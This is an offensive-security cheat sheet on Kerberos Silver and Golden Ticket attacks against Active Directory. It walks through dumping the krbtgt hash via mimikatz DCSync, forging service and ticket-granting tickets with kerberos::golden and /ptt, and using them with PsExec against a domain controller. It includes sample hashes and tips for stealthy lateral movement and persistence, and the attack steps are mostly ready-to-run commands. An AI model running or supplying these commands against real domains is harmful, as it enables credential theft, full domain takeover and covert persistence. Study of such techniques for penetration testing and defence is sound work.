# Silver & Golden Ticket Attacks

!!! tip "Tip"
    Golden tickets require the krbtgt NTLM hash (get via DCSync or NTDS.dit dump). Silver tickets only require the service account hash — lower privilege to obtain but scoped to a single service. Use golden for persistence, silver for targeted lateral movement.

---

## Key Differences

| Feature | Silver Ticket | Golden Ticket |
|---|---|---|
| Target | Single service on a host (CIFS, HTTP) | Any service / domain-wide |
| Key Required | NTLM hash of a service account | NTLM hash of the krbtgt account |
| Ticket Forged | TGS (Service ticket) | TGT (Ticket Granting Ticket) |
| DC Interaction | No (offline, stealthier) | Yes (trusted by DC) |
| Scope | One service/host | Full domain impersonation |
| Detectability | Lower | Higher |

---

# Silver Ticket Attack

## Requirements

- NTLM hash of the target service account
- SPN and hostname of the target service
- Domain SID and name

## Step 1: Obtain Service Account Hash

Retrieve via LSASS dump, `ntds.dit`, or DCSync:

```
RC4/NTLM: 4d28cf5252d39971419580a51484ca09
```

## Step 2: Forge Ticket

```powershell
mimikatz # kerberos::golden /user:jeffadmin /domain:corp.local /sid:S-1-5-21-1234... /target:web.corp.local /service:http /rc4:4d28cf... /ptt
```

## Step 3: Use the Ticket

```bash
klist
```

```powershell
Invoke-WebRequest -UseDefaultCredentials http://web.corp.local
```

---

# Golden Ticket Attack

## Requirements

- NTLM hash of the `krbtgt` account
- Domain SID and domain name
- Username to impersonate

## Step 1: Dump `krbtgt` Hash via DCSync

```powershell
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

Output:

```
NTLM: 1693c6cefafffc7af11ef34d1c788f47
```

## Step 2: Forge Ticket

```powershell
mimikatz # kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-1234... /krbtgt:1693c6ce... /ptt
```

## Step 3: Use the Ticket

```bash
klist
```

```bash
PsExec.exe \\dc01 cmd.exe
```

---

## Summary

| Feature | Silver Ticket | Golden Ticket |
|---|---|---|
| Forged Ticket | TGS | TGT |
| Scope | Single host/service | Entire domain |
| Key Needed | NTLM hash of service account | NTLM hash of krbtgt |
| DC Interaction | None | Yes |
| Use Cases | File shares, RDP, HTTP | Domain Admin, DCSync, unrestricted impersonation |

---

## Notes

- Silver Tickets for stealthy lateral movement; Golden Tickets for domain persistence
- Use BloodHound or `net group "Domain Admins"` to identify ideal users to impersonate
- `kerberos::ptt` can inject any `.kirbi` ticket independently
